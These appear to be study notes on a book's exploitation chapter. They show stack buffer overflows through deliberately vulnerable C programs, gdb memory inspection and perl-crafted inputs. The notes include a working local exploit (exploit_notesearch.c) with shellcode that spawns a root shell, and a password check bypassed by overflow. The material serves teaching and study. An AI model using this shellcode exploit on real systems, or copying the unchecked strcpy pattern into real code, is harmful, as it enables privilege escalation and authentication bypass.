#### 0x300 Exploitation

###### Buffer Overflow

C is a high-level programming language, but it assumes that the programmer is responsible for data integrity. If this responsibility were shifted over to the compiler, the resulting binaries would be significantly slower, due to integrity checks on every variable. Also, this would remove a significant level of control from the programmer and complicate the language.

```c
root@kali:~/hacking/booksrc# cat overflow_example.c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
	int value = 5;
	char buffer_one[8], buffer_two[8];

	strcpy(buffer_one, "one"); /* put "one" into buffer_one */
	strcpy(buffer_two, "two"); /* put "two" into buffer_two */

	printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);

	printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
	strcpy(buffer_two, argv[1]); /* copy first argument into buffer_two */

	printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# gcc overflow_example.c -o overflow_example
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example
[BEFORE] buffer_two is at 0xbffe894c and contains 'two'
[BEFORE] buffer_one is at 0xbffe8954 and contains 'one'
[BEFORE] value is at 0xbffe895c and is 5 (0x00000005)
Segmentation fault
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbfeb969c and contains 'two'
[BEFORE] buffer_one is at 0xbfeb96a4 and contains 'one'
[BEFORE] value is at 0xbfeb96ac and is 5 (0x00000005)

[STRCPY] copying 10 bytes into buffer_two

[AFTER] buffer_two is at 0xbfeb969c and contains '1234567890'
[AFTER] buffer_one is at 0xbfeb96a4 and contains '90'
[AFTER] value is at 0xbfeb96ac and is 5 (0x00000005)
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbf8c822c and contains 'two'
[BEFORE] buffer_one is at 0xbf8c8234 and contains 'one'
[BEFORE] value is at 0xbf8c823c and is 5 (0x00000005)

[STRCPY] copying 31 bytes into buffer_two

[AFTER] buffer_two is at 0xbf8c822c and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbf8c8234 and contains 'AAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbf8c823c and is 1094795585 (0x41414141)
root@kali:~/hacking/booksrc#
```

```c
root@kali:~/hacking/booksrc# cat exploit_notesearch.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // zero out the new memory

   strcpy(command, "./notesearch \'"); // start command buffer
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; // set return address

   for(i=0; i < 160; i+=4) // fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // build NOP sled
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

   strcat(command, "\'");

   system(command); // run exploit
   free(command);
}
root@kali:~/hacking/booksrc#
```

![Image of overflow](images/3/1.jpeg)

- Stack-Based Buffer Overflow Vulnerabilities

```c
root@kali:~/hacking/booksrc# cat auth_overflow.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	int auth_flag = 0;
	char password_buffer[16];

	strcpy(password_buffer, password);

	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# gcc auth_overflow.c -o auth_overflow
```

```sh
root@kali:~/hacking/booksrc# gcc auth_overflow.c -g -o overflow_example_debug
```

```sh
root@kali:~/hacking/booksrc# ./auth_overflow testr

Access Denied.
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./auth_overflow brillig

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./auth_overflow outgrabe

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./auth_overflow AAAAAAAAAAAAAAAAAAAAAA

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# gdb ./overflow_example_debug -q
Reading symbols from ./overflow_example_debug...done.
(gdb) list 1
1	#include <stdio.h>
2	#include <stdlib.h>
3	#include <string.h>
4
5	int check_authentication(char *password) {
6		int auth_flag = 0;
7		char password_buffer[16];
8
9		strcpy(password_buffer, password);
10
(gdb)
11		if(strcmp(password_buffer, "brillig") == 0)
12			auth_flag = 1;
13		if(strcmp(password_buffer, "outgrabe") == 0)
14			auth_flag = 1;
15
16		return auth_flag;
17	}
18
19	int main(int argc, char *argv[]) {
20		if(argc < 2) {
(gdb)
21			printf("Usage: %s <password>\n", argv[0]);
22			exit(0);
23		}
24		if(check_authentication(argv[1])) {
25			printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
26			printf("      Access Granted.\n");
27			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
28		} else {
29			printf("\nAccess Denied.\n");
30	   }
(gdb)
31	}
32
(gdb) break 9
Breakpoint 1 at 0x679: file auth_overflow.c, line 9.
(gdb) break 16
Breakpoint 2 at 0x6cd: file auth_overflow.c, line 16.
(gdb) run AAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/hacking/booksrc/overflow_example_debug AAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0xbffff82e 'A' <repeats 22 times>)
    at auth_overflow.c:9
9		strcpy(password_buffer, password);
(gdb) x/s password_buffer
0xbffff5fc:	"X", <incomplete sequence \375\267>
(gdb) x/x &auth_flag
0xbffff60c:	0x00
(gdb) print 0xbffff60c - 0xbffff5fc
$1 = 16
(gdb) x/16xw password_buffer
0xbffff5fc:	0xb7fd5858	0xb7fb1000	0xbffff6e4	0xb7ffed00
0xbffff60c:	0x00000000	0x00000000	0x80002000	0xbffff638
0xbffff61c:	0x80000729	0xbffff82e	0xbffff6e4	0xbffff6f0
0xbffff62c:	0x800006e9	0xbffff650	0x00000000	0x00000000
(gdb) c
Continuing.

Breakpoint 2, check_authentication (password=0xbffff82e 'A' <repeats 22 times>)
    at auth_overflow.c:16
16		return auth_flag;
(gdb) x/s password_buffer
0xbffff5fc:	'A' <repeats 22 times>
(gdb) x/x &auth_flag
0xbffff60c:	0x41
(gdb) x/16xw password_buffer
0xbffff5fc:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff60c:	0x41414141	0x00004141	0x80002000	0xbffff638
0xbffff61c:	0x80000729	0xbffff82e	0xbffff6e4	0xbffff6f0
0xbffff62c:	0x800006e9	0xbffff650	0x00000000	0x00000000
(gdb) x/4cb &auth_flag
0xbffff60c:	65 'A'	65 'A'	65 'A'	65 'A'
(gdb) x/dw &auth_flag
0xbffff60c:	1094795585
(gdb) c
Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
[Inferior 1 (process 4511) exited normally]
(gdb)
```

Location of ```auth_flag``` and ```password_buffer``` are inverted

```c
root@kali:~/hacking/booksrc# cat auth_overflow2.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	char password_buffer[16];
	int auth_flag = 0;

	strcpy(password_buffer, password);

	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}

root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# gcc auth_overflow2.c -g -o auth_overflow2_debug
```

```sh
root@kali:~/hacking/booksrc# gdb ./auth_overflow2_debug -q
Reading symbols from ./auth_overflow2_debug...done.
(gdb) list 1
1	#include <stdio.h>
2	#include <stdlib.h>
3	#include <string.h>
4
5	int check_authentication(char *password) {
6		char password_buffer[16];
7		int auth_flag = 0;
8
9		strcpy(password_buffer, password);
10
(gdb)
11		if(strcmp(password_buffer, "brillig") == 0)
12			auth_flag = 1;
13		if(strcmp(password_buffer, "outgrabe") == 0)
14			auth_flag = 1;
15
16		return auth_flag;
17	}
18
19	int main(int argc, char *argv[]) {
20		if(argc < 2) {
(gdb)
21			printf("Usage: %s <password>\n", argv[0]);
22			exit(0);
23		}
24		if(check_authentication(argv[1])) {
25			printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
26			printf("      Access Granted.\n");
27			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
28		} else {
29			printf("\nAccess Denied.\n");
30	   }
(gdb)
31	}
32
(gdb) break 9
Breakpoint 1 at 0x679: file auth_overflow2.c, line 9.
(gdb) break 16
Breakpoint 2 at 0x6cd: file auth_overflow2.c, line 16.
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/hacking/booksrc/auth_overflow2_debug AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0xbffff829 'A' <repeats 30 times>)
    at auth_overflow2.c:9
9		strcpy(password_buffer, password);
(gdb) x/s password_buffer
0xbffff5ec:	"X", <incomplete sequence \375\267>
(gdb) x/x &auth_flag
0xbffff5fc:	0x00
(gdb) x/16xw &auth_flag
0xbffff5fc:	0x00000000	0x00000000	0x80002000	0xbffff628
0xbffff60c:	0x80000729	0xbffff829	0xbffff6d4	0xbffff6e0
0xbffff61c:	0x800006e9	0xbffff640	0x00000000	0x00000000
0xbffff62c:	0xb7e16276	0x00000002	0xb7fb1000	0x00000000
(gdb) c
Continuing.

Breakpoint 2, check_authentication (password=0xbffff829 'A' <repeats 30 times>)
    at auth_overflow2.c:16
16		return auth_flag;
(gdb) x/s password_buffer
0xbffff5ec:	'A' <repeats 30 times>
(gdb) x/x &auth_flag
0xbffff5fc:	0x41
(gdb) x/16xw &auth_flag
0xbffff5fc:	0x41414141	0x41414141	0x41414141	0xbf004141
0xbffff60c:	0x80000729	0xbffff829	0xbffff6d4	0xbffff6e0
0xbffff61c:	0x800006e9	0xbffff640	0x00000000	0x00000000
0xbffff62c:	0xb7e16276	0x00000002	0xb7fb1000	0x00000000
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x800004b0 in puts@plt ()
(gdb)
```

```auth_flag``` is located before ```password_buffer``` in memory. This means ```auth_flag``` can never be overwritten by an overflow in ```password_buffer```.

![Image of overflow](images/3/2.jpeg)

Refer to page ```128``` - ```133``` of the book - Very detailed and nice explanation

###### Experimenting with ```BASH```

```sh
root@kali:~/hacking/booksrc# perl -e 'print "A" x 20;'
AAAAAAAAAAAAAAAAAAAA
```

```sh
root@kali:~/hacking/booksrc# perl -e 'print "\x41" x 20;'
AAAAAAAAAAAAAAAAAAAA
```

```sh
root@kali:~/hacking/booksrc#
root@kali:~/hacking/booksrc# perl -e 'print "A" x 20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ
```

```sh
root@kali:~/hacking/booksrc# $(perl -e 'print "uname";')
Linux
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# una$(perl -e 'print "m";')e
Linux
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example $(perl -e 'print "A" x 30;')
[BEFORE] buffer_two is at 0xbffda06c and contains 'two'
[BEFORE] buffer_one is at 0xbffda074 and contains 'one'
[BEFORE] value is at 0xbffda07c and is 5 (0x00000005)

[STRCPY] copying 30 bytes into buffer_two

[AFTER] buffer_two is at 0xbffda06c and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffda074 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffda07c and is 1094795585 (0x41414141)
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# gdb -q
(gdb) print 0xbf9edb1c - 0xbf9edb0c
$1 = 16
(gdb) quit
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example $(perl -e 'print "A" x 16 . "ABCD";')
[BEFORE] buffer_two is at 0xbfc6eeec and contains 'two'
[BEFORE] buffer_one is at 0xbfc6eef4 and contains 'one'
[BEFORE] value is at 0xbfc6eefc and is 5 (0x00000005)

[STRCPY] copying 20 bytes into buffer_two

[AFTER] buffer_two is at 0xbfc6eeec and contains 'AAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0xbfc6eef4 and contains 'AAAAAAAAABCD'
[AFTER] value is at 0xbfc6eefc and is 1145258561 (0x44434241)
root@kali:~/hacking/booksrc#
```

```sh
root@kali:~/hacking/booksrc# ./overflow_example $(perl -e 'print "A" x 16 . "\xef\xbe\xad\xde";')
[BEFORE] buffer_two is at 0xbfadd7ac and contains 'two'
[BEFORE] buffer_one is at 0xbfadd7b4 and contains 'one'
[BEFORE] value is at 0xbfadd7bc and is 5 (0x00000005)

[STRCPY] copying 20 bytes into buffer_two

[AFTER] buffer_two is at 0xbfadd7ac and contains 'AAAAAAAAAAAAAAAAﾭ�'
[AFTER] buffer_one is at 0xbfadd7b4 and contains 'AAAAAAAAﾭ�'
[AFTER] value is at 0xbfadd7bc and is -559038737 (0xdeadbeef)
root@kali:~/hacking/booksrc#
```